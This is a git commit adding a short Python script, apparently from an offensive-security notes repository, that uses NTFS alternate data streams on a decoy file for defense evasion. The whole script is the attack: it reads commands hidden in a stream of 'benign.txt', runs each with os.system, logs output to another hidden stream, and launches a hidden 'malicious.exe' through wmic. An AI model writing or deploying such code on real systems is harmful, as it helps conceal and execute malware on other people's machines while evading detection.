3a37b1f1e30da6e91ccd8d6fb36bc365a2664f93
Corvo <50427765+rf-peixoto@users.noreply.github.com>
2022-09-14 18:57:19 -0300

    Create alternative_data_stream.py

---
+++ Code/Python/alternative_data_stream.py
@@ -0,0 +1,20 @@
+# Ref: https://0xcybery.github.io/blog/Python-for-defense-evasion
+
+import os
+
+def buildADSFilename(filename,streamname):
+	return filename+":"+streamname
+
+decoy = "benign.txt"
+resultfile = buildADSFilename(decoy,"results.txt")
+commandfile = buildADSFilename(decoy,"commands.txt")
+
+# Run commands from file
+with open(commandfile,"r") as c:
+    for line in c:
+        str(os.system(line + " >> " + resultfile))
+
+# Run executable
+exefile = "malicious.exe"
+exepath = os.path.join(os.getcwd(),buildADSFilename(decoy,exefile))
+os.system("wmic process call create "+exepath)
